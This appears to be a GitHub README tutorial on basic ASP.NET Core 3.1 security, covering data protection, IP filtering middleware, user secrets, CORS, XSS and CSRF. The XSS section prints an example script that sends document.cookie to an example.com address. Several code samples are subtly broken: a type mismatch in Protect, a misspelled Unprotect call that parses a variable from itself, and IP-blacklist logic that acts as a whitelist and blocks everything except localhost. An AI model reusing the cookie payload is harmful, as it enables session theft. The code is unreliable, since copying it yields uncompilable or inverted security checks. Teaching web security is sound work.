<p align="center">
  <a href="https://github.com/ikbalkazanc">
    <img src="https://github.com/ikbalkazanc/Asp.NetCore-Security/blob/master/unnamed.png" alt="Logo" width="420" height="140">
  </a>

  <h3 align="center">Asp.Net Core 3.1 Basic Attacks and Solutions</h3>
  <p align="center">
    This repository explain simple but effective attacks through examples. Asp.Net can resolving many problem. <br/> We need to do just let it.
    <br />
    <br />
  </p>
</p>

* [Security Precautions](#security-precautions)
  * [Data Protection](#data-protection)
  * [IP Control](#ip-control)
  * [Secret Protection](#secret-protection)
  * [CORS](#cors-cross-origin-resource-sharing)
* [Attacks](#usage)
  * [XSS](#xss)
    * [Reflected](#reflected)
    * [Stored](#stored)
    * [Dom](#domdocument-object-model)
  * [CSRF](#csrfcross-site-request-forgery)
  * [Open Redirect Attacks](#installation)
  * [SQL Injection](#installation)
# Security Precautions
## Data Protection
Not need "TATAVA". in sum, Valuable data are require hide. Therefore we will encrypt data. Thus datas are store as encrypted for memory or cookies in client side.
```
www.domain.com/products/77
www.domain.com/products/PIjlIX2rVMPEsXyZ9rvhQJdJDxXRr5zyt_hiDhRRlBmtLo1npprgm2CMnQRcBWylcVWq8fjvwyngsfad
````

We will use `Microsoft.AspNetCore.DataProtection`. Have require two things us. Top secret key and (`IDataProtector`) dependency injection in controller. Key thinkable like door key. Key is require for opening door.
```csharp
private readonly IDataProtector _dataProtector;

public ProductController(IDataProtectionProvider provider)
{
  _dataProtector = provider.CreateProtector("private_key_for_example_can_be_ProductController");            
}
````
And we can define encrypter in action input and output. I'm fondle .Net Core's eye. it is just that easy.  
```csharp
public IActionResult Index()
{
  int userId = 1001;
  int encrypUserId = _dataProtector.Protect(userId);
  return View(encrypUserId);
}
````
```csharp
public IActionResult Index(string encryptedId)
{
  int userPassword = Int32.Parse(_dataProtector.Unrotect(userPassword));
  return View();
}
````
<bold>Note :</bold> Above all must add `services.AddDataProtection()` in `Startup.cs` services. Also all of these can be as middleware.

## IP Control
IP control provide to define blacklist or whitelist for IPs. We will manegement IP lists. Thus we can block malicious. We will code as middleware level in this sample. Therefore we need to define `RequestDelegate` in dependency injections.   
```csharp
private readonly RequestDelegate _next;
private readonly string[] _ipBlackList = {"127.0.0.1", "::1"};
  
public IPSafeMiddleWare(RequestDelegate next)
{
  _next = next;
}
```
And coding `Invoke()` method. This method provide coding middleware to us. Required request context for method. And we check that it is in blacklist.
```csharp
public async Task Invoke(HttpContext context)
{
  var requestIpAdress = context.Connection.RemoteIpAddress;
  var isWhiteList = _ipBlackList.Where(x => IPAddress.Parse(x).Equals(requestIpAdress)).Any();
  if (!isWhiteList)
  {
    context.Response.StatusCode = (int) HttpStatusCode.Forbidden;
    return;
  }           
  await _next(context);
 }
```
Last all we need to do let know middleware to asp.net. We define `IPSafeMiddleware` in `Startup.cs` `Configure` method. And finished.
```csharp
app.UseMiddleware<IPSafeMiddleWare>();
```
Actually you can do this checking process as filter too. Thus you can checking ip in controller level or action level. Maybe this can improve performance.  
## Secret Protection
Normally we are recording connection string to `appsettings.json`. But datas not be in safe there. Asp.Net Core is avert this situation. it's providing top secret file for top secret data. Thanks Bill Doors 🙏. <br/>
<div align="center">
<img src="https://github.com/ikbalkazanc/Asp.NetCore-Security/blob/master/resim_2020-11-23_022355.png" alt="Logo" width="360" height="120">
  </div>
<br/>

We can access by right click web project file then choice `Manage Users Secrets` so to top secret file. Now, We can write secret contexts inside of `appsettings.json` to this json file. Asp.NET Core add `secrets.json` inside to `appsettings.json` in compile time. Thinkable like one file.   

## CORS (Cross-Origin Resource Sharing)
in sum, Permission is required to pass through CORS. in conclusion not its dad's farm. We need to a policy key for permission. We can define CORS in `Startup.cs` services. Then require add inside middleware layer like this `app.UseCors("AllowSites");`. 
````csharp
public void ConfigureServices(IServiceCollection services)
{
  services.AddCors(options =>
  {   
    //allow all domains            
    options.AddDefaultPolicy(builder =>
    {
      builder.AllowAnyOrigin().AllowAnyHeader().AllowAnyMethod();
    }); 
    
    //allow spesific domains
    options.AddPolicy("AllowSites", builder =>
    {
      builder.WithOrigins("https://localhost:44355", "https://anywebsites.com", "etc.")
      .AllowAnyHeader().AllowAnyMethod();
    });
  });
}
````
Also we can define more specific rules. I tried explain in project file. You can examine.

# Attacks
## XSS
This is a kind of script vulnerability. Done by integrate harmful script in our HTML and JS files. There are 3 ways. But we can apply same solution all of them. Net Core provide solution as default. Again thanks great dot net. Not need to define in `Startup.cs` file. if we want we can disable it.
```html
<script> new Image().\"http://example.com/readCookie/?account=\"+document.cookie\"</script>
```
as example, when this script integrated to our js codes it's send to own "domain". that's very simple process but so effective. XSS attacks are one of the most common forms of Web Attacks, and this type of attack accounts for 12.75% of all web attacks.
### Reflected
Hacker is integrate scripts to browser in client side. Nevertheless we can block this scripts. He's can access a user data.
### Stored
Hacker is integrate scripts to source code in server side. it's so dangerous. Hacker can access all users data.  
### Dom(Document Object Model)
This way genrally weld up from trying to payload after # sign.
## CSRF(Cross Site Request Forgery)
<div align="center">
<a href="https://github.com/ikbalkazanc">
    <img src="https://github.com/ikbalkazanc/Asp.NetCore-Security/blob/master/cross_site_request_forger_1.png.jpg" alt="Logo" width="80%" height="80%" ">
</a></div>
Actually picture explain everything. in sum, hacker is creating new request with using fake url. in meantime he's stealing datas inside of request.</br>
Solution of this problem is simple too with Asp.Net Core. We're will using application level filter. We're adding service in `Startup.cs` file. And it finished.
````csharp
services.AddControllersWithViews(opt =>
{
  opt.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());
});
````

if you want disable antiforgery token in controller level.

````csharp
[IgnoreAntiforgeryToken]     
public IActionResult Index()
{     
  return View();
}
````

<!-- CONTACT -->
## Contact
Muhammet İkbal KAZANCI - [LinkedIn](https://www.linkedin.com/in/ikbalkazanc/) - mi.kazanci@hotmail.com

